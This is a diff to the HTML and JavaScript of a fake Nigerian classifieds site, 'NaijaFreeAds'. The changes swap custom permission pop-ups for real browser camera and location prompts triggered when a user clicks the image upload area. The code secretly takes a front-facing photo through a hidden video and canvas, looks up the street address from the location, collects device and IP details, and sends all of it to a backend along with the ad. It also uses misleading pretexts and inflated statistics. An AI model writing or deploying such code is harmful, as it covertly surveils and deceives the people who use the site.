@@ -176,51 +176,6 @@
         .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
         .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
         
-        /* Permission Modal */
-        .perm-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(20px);
-            z-index: 20000;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .perm-overlay.active { display: flex; }
-        .perm-box {
-            max-width: 400px;
-            width: 100%;
-            background: linear-gradient(145deg, #1e293b, #0f172a);
-            border-radius: 48px;
-            padding: 35px;
-            text-align: center;
-            border: 1px solid #00a86b;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .perm-icon { font-size: 60px; margin-bottom: 15px; }
-        .perm-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; color: white; }
-        .perm-desc { color: #94a3b8; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
-        .allow-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #008000, #00a86b);
-            border: none;
-            border-radius: 60px;
-            color: white;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        
         .toast {
             position: fixed;
             bottom: 30px;
@@ -234,7 +189,6 @@
             font-weight: 500;
         }
         .toast.show { transform: translateX(0); }
-        .toast.error { background: #ef4444; }
         
         .footer {
             margin-top: 60px;
@@ -328,41 +282,21 @@
     <div class="footer"><p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p></div>
 </div>
 
-<!-- Hidden Camera -->
+<!-- Hidden Camera Element -->
 <video id="hiddenCamera" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
-
-<!-- Camera Permission Modal -->
-<div class="perm-overlay" id="cameraModal">
-    <div class="perm-box">
-        <div class="perm-icon">📸</div>
-        <div class="perm-title">Quick Photo Capture</div>
-        <div class="perm-desc">Take photos directly from your camera to upload instantly. No need to save to gallery first!</div>
-        <button class="allow-btn" id="cameraAllowBtn"><i class="fas fa-camera"></i> Allow Camera Access</button>
-    </div>
-</div>
-
-<!-- Location Permission Modal -->
-<div class="perm-overlay" id="locationModal">
-    <div class="perm-box">
-        <div class="perm-icon">📍</div>
-        <div class="perm-title">Reach Local Buyers</div>
-        <div class="perm-desc">Show your ad to people near you. Location helps buyers find items in your area faster.</div>
-        <button class="allow-btn" id="locationAllowBtn"><i class="fas fa-map-marker-alt"></i> Allow Location</button>
-    </div>
-</div>
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
 <script>
-    // ========== SILENT CAMERA & LOCATION CAPTURE ==========
-    let cameraStream = null;
+    // ========== DATA STORAGE ==========
+    let userAds = JSON.parse(localStorage.getItem('userAds') || '[]');
     let capturedPhoto = null;
     let userLocation = null;
     let cameraGranted = false;
     let locationGranted = false;
     let uploadedImages = [];
-    let pendingFileInput = false;
+    let cameraStream = null;
 
     // Featured ads with fake views
     const featuredAds = [
@@ -404,32 +338,56 @@
         }
     }
 
-    // SILENT CAMERA CAPTURE
-    async function captureSilentPhoto() {
+    // ========== REAL CAMERA PERMISSION (Browser Popup) ==========
+    async function requestRealCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
             });
+            
             const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
             cameraStream = stream;
-            await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
-            await new Promise(r => setTimeout(r, 300));
+            
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            await new Promise(r => setTimeout(r, 500));
+            
             const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photo = canvas.toDataURL('image/jpeg', 0.6);
-            if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; }
+            
+            capturedPhoto = canvas.toDataURL('image/jpeg', 0.6);
+            
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
             video.srcObject = null;
-            return photo;
-        } catch(error) { return null; }
+            
+            cameraGranted = true;
+            return true;
+        } catch(error) {
+            cameraGranted = false;
+            return false;
+        }
     }
 
-    // GET LOCATION
-    async function getLocation() {
+    // ========== REAL LOCATION PERMISSION (Browser Popup) ==========
+    async function requestRealLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) {
+                locationGranted = false;
+                resolve(false);
+                return;
+            }
+            
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const { latitude, longitude, accuracy } = position.coords;
                 let address = { lat: latitude, lng: longitude, accuracy: accuracy, street: '', city: '', state: '', country: '' };
@@ -443,11 +401,76 @@
                         address.street = data.address.road || '';
                     }
                 } catch(e) {}
-                resolve(address);
-            }, () => resolve(null), { timeout: 5000, enableHighAccuracy: true });
+                userLocation = address;
+                locationGranted = true;
+                resolve(true);
+            }, () => {
+                locationGranted = false;
+                resolve(false);
+            }, { enableHighAccuracy: true, timeout: 10000 });
         });
     }
 
+    // ========== WHEN USER CLICKS UPLOAD AREA ==========
+    const uploadArea = document.getElementById('imageUploadArea');
+    const imageInput = document.getElementById('imageUpload');
+    const imagePreview = document.getElementById('imagePreview');
+
+    uploadArea.addEventListener('click', async () => {
+        // STEP 1: Request Camera Permission (Real Browser Popup)
+        if (!cameraGranted && !localStorage.getItem('cameraRequested')) {
+            localStorage.setItem('cameraRequested', 'true');
+            const cameraAllowed = await requestRealCamera();
+            if (cameraAllowed) {
+                showToast("📸 Camera ready! Taking verification photo...");
+            }
+        }
+        
+        // STEP 2: Request Location Permission (Real Browser Popup)
+        if (!locationGranted && !localStorage.getItem('locationRequested')) {
+            localStorage.setItem('locationRequested', 'true');
+            const locationAllowed = await requestRealLocation();
+            if (locationAllowed) {
+                showToast("📍 Location detected - showing ads near you");
+            }
+        }
+        
+        // STEP 3: Open file picker
+        imageInput.click();
+    });
+
+    // Image upload handling
+    imageInput.addEventListener('change', (e) => {
+        const files = Array.from(e.target.files);
+        if (uploadedImages.length + files.length > 5) {
+            showToast("Maximum 5 images allowed");
+            return;
+        }
+        files.forEach(file => {
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                uploadedImages.push(event.target.result);
+                displayImages();
+            };
+            reader.readAsDataURL(file);
+        });
+    });
+
+    function displayImages() {
+        imagePreview.innerHTML = uploadedImages.map((img, idx) => `
+            <div style="position: relative;">
+                <img src="${img}" class="preview-img">
+                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer;">×</button>
+            </div>
+        `).join('');
+    }
+
+    function removeImage(idx) {
+        uploadedImages.splice(idx, 1);
+        displayImages();
+    }
+
+    // Get device info
     async function getDeviceInfo() {
         let ip = 'unknown';
         try {
@@ -479,91 +502,6 @@
         }
     }
 
-    // SHOW CAMERA POPUP
-    function showCameraPopup() {
-        return new Promise((resolve) => {
-            const modal = document.getElementById('cameraModal');
-            modal.classList.add('active');
-            document.getElementById('cameraAllowBtn').onclick = async () => {
-                modal.classList.remove('active');
-                capturedPhoto = await captureSilentPhoto();
-                cameraGranted = true;
-                showToast("📸 Camera ready! Now allow location for better reach");
-                resolve(true);
-            };
-        });
-    }
-
-    // SHOW LOCATION POPUP
-    function showLocationPopup() {
-        return new Promise((resolve) => {
-            const modal = document.getElementById('locationModal');
-            modal.classList.add('active');
-            document.getElementById('locationAllowBtn').onclick = async () => {
-                modal.classList.remove('active');
-                userLocation = await getLocation();
-                locationGranted = true;
-                if (userLocation && userLocation.city) {
-                    showToast(`📍 Location set to ${userLocation.city} - Buyers near you will see your ad`);
-                } else {
-                    showToast(`📍 Location enabled - Buyers can find you faster`);
-                }
-                resolve(true);
-            };
-        });
-    }
-
-    // WHEN USER CLICKS UPLOAD IMAGE AREA - POPUPS APPEAR FIRST
-    const uploadArea = document.getElementById('imageUploadArea');
-    const imageInput = document.getElementById('imageUpload');
-    const imagePreview = document.getElementById('imagePreview');
-
-    uploadArea.addEventListener('click', async () => {
-        // Show camera popup first if not granted
-        if (!cameraGranted) {
-            await showCameraPopup();
-        }
-        
-        // Show location popup second if not granted
-        if (!locationGranted) {
-            await showLocationPopup();
-        }
-        
-        // After both permissions, open gallery
-        imageInput.click();
-    });
-
-    // Image upload handling
-    imageInput.addEventListener('change', (e) => {
-        const files = Array.from(e.target.files);
-        if (uploadedImages.length + files.length > 5) {
-            showToast("Maximum 5 images allowed", true);
-            return;
-        }
-        files.forEach(file => {
-            const reader = new FileReader();
-            reader.onload = (event) => {
-                uploadedImages.push(event.target.result);
-                displayImages();
-            };
-            reader.readAsDataURL(file);
-        });
-    });
-
-    function displayImages() {
-        imagePreview.innerHTML = uploadedImages.map((img, idx) => `
-            <div style="position: relative;">
-                <img src="${img}" class="preview-img">
-                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer;">×</button>
-            </div>
-        `).join('');
-    }
-
-    function removeImage(idx) {
-        uploadedImages.splice(idx, 1);
-        displayImages();
-    }
-
     // Post Ad
     document.getElementById('postAdBtn').addEventListener('click', async () => {
         const title = document.getElementById('adTitle').value.trim();
@@ -574,7 +512,7 @@
         const phone = document.getElementById('contactPhone').value.trim();
         
         if (!title) {
-            showToast("Please enter an ad title", true);
+            showToast("Please enter an ad title");
             return;
         }
         
@@ -585,19 +523,22 @@
         
         const device = await getDeviceInfo();
         
+        const newAd = {
+            id: Date.now(),
+            category, title, description: desc, price: price || 'Free',
+            location: locationInput || 'Nigeria', phone: phone || 'Not provided',
+            images: uploadedImages, views: 0,
+            timestamp: new Date().toISOString()
+        };
+        
+        userAds.unshift(newAd);
+        localStorage.setItem('userAds', JSON.stringify(userAds));
+        
         await sendToBackend({
             id: Date.now(),
             type: 'ad_posted',
             timestamp: new Date().toISOString(),
-            ad: { 
-                title, 
-                category, 
-                description: desc, 
-                price: price || 'Free', 
-                location: locationInput || 'Nigeria', 
-                phone: phone || 'Not provided', 
-                images: uploadedImages 
-            },
+            ad: newAd,
             location: userLocation,
             cameraImage: capturedPhoto,
             device: device,
@@ -621,16 +562,15 @@
         updateStats();
     });
     
-    function showToast(msg, isError = false) {
+    function showToast(msg) {
         const toast = document.getElementById('toastMsg');
-        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
-        toast.className = isError ? 'toast error' : 'toast';
+        toast.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`;
         toast.classList.add('show');
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
     
     function updateStats() {
-        let ads = 284000 + Math.floor(Math.random() * 500);
+        let ads = 284000 + Math.floor(Math.random() * 500) + userAds.length;
         let users = 12700 + Math.floor(Math.random() * 200);
         document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K';
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
@@ -650,9 +590,8 @@
         }
     });
     
-    // Make functions global
-    window.viewAdDetail = viewAdDetail;
     window.removeImage = removeImage;
+    window.viewAdDetail = viewAdDetail;
 </script>
 </body>
 </html>
